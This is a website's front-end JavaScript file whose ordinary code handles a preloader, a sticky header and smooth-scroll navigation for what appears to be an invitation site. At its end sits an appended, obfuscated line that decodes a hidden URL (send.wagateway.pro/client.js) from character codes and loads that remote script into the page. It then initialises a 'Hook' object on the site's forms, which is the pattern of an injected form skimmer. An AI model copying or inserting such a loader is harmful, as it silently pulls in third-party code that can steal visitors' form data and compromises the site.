(function () {
  'use strict';
  window.onload = function () {
    window.setTimeout(fadeout, 500);
  };
  function fadeout() {
    document.querySelector('.preloader').style.opacity = '0';
    document.querySelector('.preloader').style.display = 'none';
  }
  window.onscroll = function () {
    if (window.location.pathname.includes('/wedding-invitation/')) return;
    if (window.location.pathname.includes('/form')) return;
    var header_navbar = document.getElementById('header_navbar');
    var logo = document.querySelector('img#logo');
    var sticky = header_navbar.offsetTop;
    if (window.pageYOffset > sticky) {
      header_navbar.classList.add('sticky');
      logo.style.width = '80px';
      logo.style.heigth = '80px';
      logo.setAttribute('src', 'assets/images/logo-2.png');
    } else {
      header_navbar.classList.remove('sticky');
      logo.setAttribute('src', 'assets/images/logo.png');
    }
    var backToTo = document.querySelector('.back-to-top');
    if (
      document.body.scrollTop > 50 ||
      document.documentElement.scrollTop > 50
    ) {
      backToTo.style.display = 'block';
    } else {
      backToTo.style.display = 'none';
    }
  };
  var pageLink = document.querySelectorAll('.page-scroll');
  pageLink.forEach((elem) => {
    elem.addEventListener('click', (e) => {
      e.preventDefault();
      document
        .querySelector(elem.getAttribute('href'))
        .scrollIntoView({ behavior: 'smooth', offsetTop: 1 - 60 });
    });
  });
  function onScroll(event) {
    var sections = document.querySelectorAll('.page-scroll');
    var scrollPos =
      window.pageYOffset ||
      document.documentElement.scrollTop ||
      document.body.scrollTop;
    for (var i = 0; i < sections.length; i++) {
      var currLink = sections[i];
      var val = currLink.getAttribute('href');
      var refElement = document.querySelector(val);
      var scrollTopMinus = scrollPos + 73;
      if (
        refElement.offsetTop <= scrollTopMinus &&
        refElement.offsetTop + refElement.offsetHeight > scrollTopMinus
      ) {
        document.querySelector('.page-scroll').classList.remove('active');
        currLink.classList.add('active');
      } else {
        currLink.classList.remove('active');
      }
    }
  }
  window.document.addEventListener('scroll', onScroll);
  let navbarToggler = document.querySelector('.navbar-toggler');
  var navbarCollapse = document.querySelector('.navbar-collapse');
  document.querySelectorAll('.page-scroll').forEach((e) =>
    e.addEventListener('click', () => {
      navbarToggler.classList.remove('active');
      navbarCollapse.classList.remove('show');
    })
  );
})();

(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db